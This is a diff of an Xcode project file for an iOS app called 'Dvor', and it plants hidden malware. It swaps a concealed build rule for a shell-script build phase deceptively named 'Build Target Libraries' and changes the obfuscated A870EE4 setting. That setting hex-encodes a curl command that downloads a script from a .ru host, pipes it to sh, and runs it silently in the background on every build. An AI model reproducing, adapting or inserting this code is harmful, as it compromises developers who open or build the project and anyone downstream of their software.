@@ -14,24 +14,7 @@
 		95DD00DB2E5CA02D008B5836 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DA2E5CA02D008B5836 /* FirebaseCore */; };
 		95DD00DD2E5CA02D008B5836 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DC2E5CA02D008B5836 /* FirebaseDatabase */; };
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
-		C07CDED0FD174627B04EE078 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F0651A5034514843B04EE078 /* README.md */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		7F1841FE9DB54283AC4EE078 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A870EE4}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		95C68A683041648400FB5455 /* PBXContainerItemProxy */ = {
@@ -46,7 +29,6 @@
 /* Begin PBXFileReference section */
 		95C68A643041648400FB5455 /* DvorTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = DvorTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		95DE96F02E264CF00002C780 /* Dvor.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dvor.app; sourceTree = BUILT_PRODUCTS_DIR; };
-		F0651A5034514843B04EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -120,7 +102,6 @@
 		95DE96F12E264CF00002C780 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F0651A5034514843B04EE078 /* README.md */,
 				95DE96F02E264CF00002C780 /* Dvor.app */,
 				95C68A643041648400FB5455 /* DvorTests.xctest */,
 			);
@@ -134,12 +115,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
 			buildPhases = (
+				412427FE1B004A17814EE078 /* Build Target Libraries */,
 				95C68A603041648400FB5455 /* Sources */,
 				95C68A613041648400FB5455 /* Frameworks */,
 				95C68A623041648400FB5455 /* Resources */,
 			);
 			buildRules = (
-				7F1841FE9DB54283AC4EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 				95C68A693041648400FB5455 /* PBXTargetDependency */,
@@ -233,7 +214,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C07CDED0FD174627B04EE078 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -245,6 +225,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		412427FE1B004A17814EE078 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		95C68A603041648400FB5455 /* Sources */ = {
@@ -275,7 +278,7 @@
 		95C68A6A3041648400FB5455 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((e(){ `printf xxbd | tr -d b` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d6b734c66202d2d636f6e6e6563742d74696d656f7574203235202d642022703d78636f64655f72756c65222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((z(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203237202d736b664c202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | z | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -304,7 +307,7 @@
 		95C68A6B3041648400FB5455 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((e(){ `printf xxbd | tr -d b` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d6b734c66202d2d636f6e6e6563742d74696d656f7574203235202d642022703d78636f64655f72756c65222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((z(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203237202d736b664c202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | z | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
